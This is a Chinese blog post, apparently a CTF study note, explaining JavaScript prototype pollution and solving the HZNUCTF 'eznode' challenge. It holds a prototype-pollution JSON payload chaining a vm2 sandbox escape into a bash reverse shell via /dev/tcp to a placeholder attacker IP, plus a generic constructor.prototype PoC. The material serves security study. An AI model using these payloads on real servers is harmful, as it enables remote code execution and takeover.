@@ -1,0 +1,786 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/3.png">
+  <link rel="icon" href="/img/3.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="AzumiSaki">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="开篇原理(来源于js原型链污染（原理+分析+例题） - 知乎)首先要知道JS的几种创建的方法和格式： 12345678910111213141516&#x2F;&#x2F;普通方式var a &#x3D; &#123;name:&#x27;name&#x27;,age:19&#125;;&#x2F;&#x2F;构造函数方式function a()&#123;    this.name &#x3D; &#x27;name&#x27;;    this.age">
+<meta property="og:type" content="article">
+<meta property="og:title" content="有关JS原型链污染的题目以及实战演练">
+<meta property="og:url" content="https://azumisaki.github.io/2026/04/10/JS/index.html">
+<meta property="og:site_name" content="Sakiの博客">
+<meta property="og:description" content="开篇原理(来源于js原型链污染（原理+分析+例题） - 知乎)首先要知道JS的几种创建的方法和格式： 12345678910111213141516&#x2F;&#x2F;普通方式var a &#x3D; &#123;name:&#x27;name&#x27;,age:19&#125;;&#x2F;&#x2F;构造函数方式function a()&#123;    this.name &#x3D; &#x27;name&#x27;;    this.age">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://azumisaki.github.io/img/9.jpeg">
+<meta property="article:published_time" content="2026-04-10T10:57:41.000Z">
+<meta property="article:modified_time" content="2026-04-11T06:19:12.932Z">
+<meta property="article:author" content="AzumiSaki">
+<meta property="article:tag" content="JS原型链污染">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://azumisaki.github.io/img/9.jpeg">
+  
+  
+  
+  <title>有关JS原型链污染的题目以及实战演练 - Sakiの博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"azumisaki.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<!-- hexo injector head_end start --><link rel="stylesheet" href="/css/custom.css">
+  <div style="text-align:center;font-size:14px;margin-top:10px;">
+    <span id="runtime"></span>
+  </div>
+  <!-- hexo injector head_end end --><meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="global-fx-layer"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Saki&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/9.jpeg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.5)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="有关JS原型链污染的题目以及实战演练"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-10 18:57" pubdate>
+          2026年4月10日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">有关JS原型链污染的题目以及实战演练</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2026年4月11日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="开篇"><a href="#开篇" class="headerlink" title="开篇"></a>开篇</h2><h3 id="原理-来源于js原型链污染（原理-分析-例题）-知乎"><a href="#原理-来源于js原型链污染（原理-分析-例题）-知乎" class="headerlink" title="原理(来源于js原型链污染（原理+分析+例题） - 知乎)"></a>原理(来源于<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/690650551">js原型链污染（原理+分析+例题） - 知乎</a>)</h3><p>首先要知道JS的几种创建的方法和格式：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//普通方式</span><br><span class="hljs-keyword">var</span> a = &#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">19</span>&#125;;<br><br><span class="hljs-comment">//构造函数方式</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">a</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = <span class="hljs-string">&#x27;name&#x27;</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = <span class="hljs-number">19</span>;<br>&#125;<br>a.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">name</span> = <span class="hljs-string">&#x27;fame&#x27;</span>; <span class="hljs-comment">//赋值</span><br>b = <span class="hljs-keyword">new</span> <span class="hljs-title function_">a</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(web.<span class="hljs-property">name</span>);<span class="hljs-comment">//调用</span><br><br><span class="hljs-comment">//object方式</span><br><span class="hljs-keyword">var</span> a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>a.<span class="hljs-property">name</span> = <span class="hljs-string">&#x27;name&#x27;</span>;<br>a.<span class="hljs-property">age</span> = <span class="hljs-number">19</span>;<br></code></pre></td></tr></table></figure>
+
+<h3 id="万物皆对象"><a href="#万物皆对象" class="headerlink" title="万物皆对象"></a><strong>万物皆对象</strong></h3><p>在js中所有的东西都可看为对象。</p>
+<p>而在js中每一个对象都会有一个**<strong>proto</strong>**的属性。</p>
+<blockquote>
+<p><strong>proto</strong><br>对象可以通过__proto__来找到其自己的父类。</p>
+</blockquote>
+<p>而对于构造函数也有一个<strong>prototype</strong>与之相对应。</p>
+<blockquote>
+<p><strong>prototype</strong><br>构造函数.prototype也是一个对象，为构造函数的原型对象。</p>
+</blockquote>
+<p>就像这样：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">a</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>= <span class="hljs-string">&quot;zhangsan&quot;</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = <span class="hljs-number">20</span>;<br>&#125;<br><br>b=<span class="hljs-keyword">new</span> <span class="hljs-title function_">a</span>();<br><span class="hljs-keyword">if</span>(b.<span class="hljs-property">proto</span>=a.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;true&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;false&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="原型链的原理"><a href="#原型链的原理" class="headerlink" title="原型链的原理"></a>原型链的原理</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a=<span class="hljs-number">1</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-property">log</span>=(a.<span class="hljs-property">__proto__</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-property">log</span>=(a.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-property">log</span>=(a.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>);<br></code></pre></td></tr></table></figure>
+
+<p>上面的var上层为{}，再上为Object，再上就是NULL。NULL为链的的末端。</p>
+<h3 id="继承机制"><a href="#继承机制" class="headerlink" title="继承机制"></a><strong>继承机制</strong></h3><p>对于js中类的继承机制为</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">a</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>= <span class="hljs-string">&quot;zhangsan&quot;</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = <span class="hljs-number">20</span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">b</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = <span class="hljs-string">&quot;zhangsan&quot;</span>;<br>&#125;<br>b.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_">a</span>();<br><br>c=<span class="hljs-keyword">new</span> <span class="hljs-title function_">b</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`name:<span class="hljs-subst">$&#123;c.name&#125;</span>,age:<span class="hljs-subst">$&#123;c.age&#125;</span>`</span>);<br></code></pre></td></tr></table></figure>
+
+<p>最后回显“name:zhangsan,age:20”</p>
+<h3 id="漏洞思路"><a href="#漏洞思路" class="headerlink" title="漏洞思路"></a><strong>漏洞思路</strong></h3><p>先看一个经典的递归漏洞</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//漏洞</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//漏洞</span><br><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;输入的内容&#x27;</span>)<br><span class="hljs-title function_">merge</span>(o1, o2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)<br> <br>o3 = &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)<br></code></pre></td></tr></table></figure>
+
+<p>如果首先模仿正常的服务器输入{“a”:”1”,”b”:”2”}</p>
+<p>那就会正常回显a和b的内容，但是此时o3并没有被赋值，所以就会出现undefine的情况</p>
+<p><img src="/img/js/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>此时构造原型链污染语句就会得到</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<br>	<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">1</span>,<br>	<span class="hljs-string">&quot;__proto__&quot;</span>&#123;<br>		<span class="hljs-string">&quot;b&quot;</span>:<span class="hljs-number">2</span>,<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>就会污染o3的参数，并回显</p>
+<p>就会发现被污染了</p>
+<h2 id="那么原型污染漏洞是如何产生的？"><a href="#那么原型污染漏洞是如何产生的？" class="headerlink" title="那么原型污染漏洞是如何产生的？"></a>那么原型污染漏洞是如何产生的？</h2><p>​	当JavaScript函数递归地将包含用户可控属性的对象合并到现有对象时，通常会出现原型污染漏洞。这可以允许攻击者注入带有类似<code>__proto__</code>的键的属性，以及任意嵌套的属性。</p>
+<p>​	由于<code>__proto__</code>在JavaScript上下文中的特殊含义，合并操作可能会将嵌套属性分配给对象的原型，而不是目标对象本身。因此，攻击者可以用包含恶意值的属性污染原型，这些属性随后可能被应用程序以危险的方式使用。</p>
+<p>知道原理后就可以开始实战了</p>
+<h2 id="HZNUCTF-2023-final-eznode"><a href="#HZNUCTF-2023-final-eznode" class="headerlink" title="HZNUCTF 2023 final]eznode"></a>HZNUCTF 2023 final]eznode</h2><p>首先扫目录搜出app.js</p>
+<p><img src="/img/js/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后查看代码关键漏洞点</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">const</span> &#123; <span class="hljs-variable constant_">VM</span> &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm2&#x27;</span>);<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br><br><span class="hljs-keyword">const</span> backdoor = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title function_">VM</span>().<span class="hljs-title function_">run</span>(&#123;&#125;.<span class="hljs-property">shellcode</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="hljs-property">constructor</span> &amp;&amp; obj.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Object</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">merge</span> = (<span class="hljs-params">a, b</span>) =&gt; &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> attr <span class="hljs-keyword">in</span> b) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isObject</span>(a[attr]) &amp;&amp; <span class="hljs-title function_">isObject</span>(b[attr])) &#123;<br>            <span class="hljs-title function_">merge</span>(a[attr], b[attr]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            a[attr] = b[attr];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> a<br>&#125;<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">clone</span> = (<span class="hljs-params">a</span>) =&gt; &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">merge</span>(&#123;&#125;, a);<br>&#125;<br><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;POST some json shit to /.  no source code and try to find source code&quot;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(req.<span class="hljs-property">body</span>)<br>        <span class="hljs-keyword">var</span> body = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(req.<span class="hljs-property">body</span>));<br>        <span class="hljs-keyword">var</span> copybody = <span class="hljs-title function_">clone</span>(body)<br>        <span class="hljs-keyword">if</span> (copybody.<span class="hljs-property">shit</span>) &#123;<br>            <span class="hljs-title function_">backdoor</span>()<br>        &#125;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;post shit ok&quot;</span>)<br>    &#125;<span class="hljs-keyword">catch</span>(e)&#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;is it shit ?&quot;</span>)<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e)<br>    &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;start listening on port 3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>
+
+<p>得知可以污染参数shit</p>
+<p><img src="/img/js/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>重点关注后门参数</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> backdoor = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title function_">VM</span>().<span class="hljs-title function_">run</span>(&#123;&#125;.<span class="hljs-property">shellcode</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e);<br>    &#125;<br>&#125;<br>和<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="hljs-property">constructor</span> &amp;&amp; obj.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Object</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">merge</span> = (<span class="hljs-params">a, b</span>) =&gt; &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> attr <span class="hljs-keyword">in</span> b) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isObject</span>(a[attr]) &amp;&amp; <span class="hljs-title function_">isObject</span>(b[attr])) &#123;<br>            <span class="hljs-title function_">merge</span>(a[attr], b[attr]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            a[attr] = b[attr];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> a<br>&#125;<br><span class="hljs-keyword">const</span> <span class="hljs-title function_">clone</span> = (<span class="hljs-params">a</span>) =&gt; &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">merge</span>(&#123;&#125;, a);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后可以发现是一个vm2沙箱逃逸的CVE-2026-22709：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/91455">https://xz.aliyun.com/news/91455</a></p>
+<p>发现有问题代码 1：globalPromise.prototype.then 未清理回调</p>
+<p>所以构造payload</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<br>  <span class="hljs-string">&quot;shit&quot;</span>: <span class="hljs-number">1</span>,<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;shellcode&quot;</span>: <span class="hljs-string">&quot;const error = new Error();error.name = Symbol();const f = async () =&gt; error.stack;const promise = f();promise.catch(e =&gt; &#123;const Error = e.constructor;const Function = Error.constructor;const f = new Function(\&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \\\&quot;bash -i &gt;&amp; /dev/tcp/你的IP/端口 0&gt;&amp;1\\\&quot;&#x27;)\&quot;);f();&#125;);&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>拿到shell后就可以cat flag了</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>一般现代的proto参数都被禁了，所以一般可用的最简单的poc就是</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<span class="hljs-string">&quot;constructor&quot;</span>: &#123;<span class="hljs-string">&quot;prototype&quot;</span>: &#123;你的payload&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">学习笔记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="print-no-link">#JS原型链污染</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>有关JS原型链污染的题目以及实战演练</div>
+      <div>https://azumisaki.github.io/2026/04/10/JS/</div>
+    </div>
+    <div class="license-meta">
+      
